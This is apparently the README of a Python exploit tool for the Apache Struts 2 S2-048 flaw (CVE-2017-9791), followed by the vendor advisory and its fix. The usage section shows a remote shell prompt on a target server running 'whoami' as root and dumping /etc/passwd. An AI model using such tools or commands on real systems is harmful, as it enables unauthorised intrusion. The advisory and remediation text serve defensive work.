# St2-048 Remote Code Execution
Apache Struts 2  possible RCE in the Struts Showcase app in the Struts 1 plugin example in the Struts 2.3.x series

http://struts.apache.org/docs/s2-048.html 
# 参考文章链接：
# 【漏洞分析】Struts2高危漏洞S2-048分析
http://m.bobao.360.cn/learning/detail/4078.html

# Use-Age:

> python St2-048.py
set url :http://**.**.**.**:port/integration/saveGangster.action
cmd >>: whoami
root

cmd >>: cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
messagebus:x:104:107::/var/run/dbus:/bin/false

cmd >>:

##  Summary
Possible RCE in the Struts Showcase app in the Struts 1 plugin example in Struts 2.3.x series


Who should read this	          All Struts 2 developers and users should read this

Impact of vulnerability	         Possible RCE when using the Struts 2 Struts 1 plugin

Maximum security rating       	High

Recommendation	                Please read the Solution section

Affected Software	              Struts 2.3.x with Struts 1 plugin and Struts 1 action

Reporter	                      icez <ic3z at qq dot com> from Tophant Competence Center

CVE Identifier	                CVE-2017-9791


##  Problem

It is possible to perform a RCE attack with a malicious field value when using the Struts 2 Struts 1 plugin and it's a Struts 1 action and the value is a part of a message presented to the user, i.e. when using untrusted input as a part of the error message in the ActionMessage class.

##  Solution

Always use resource keys instead of passing a raw message to the ActionMessage as shown below, never pass a raw value directly

  messages.add("msg", new ActionMessage("struts1.gangsterAdded", gform.getName()));

and never like this

  messages.add("msg", new ActionMessage("Gangster " + gform.getName() + " was added"));

##  Backward compatibility

No backward incompatibility issues are expected.

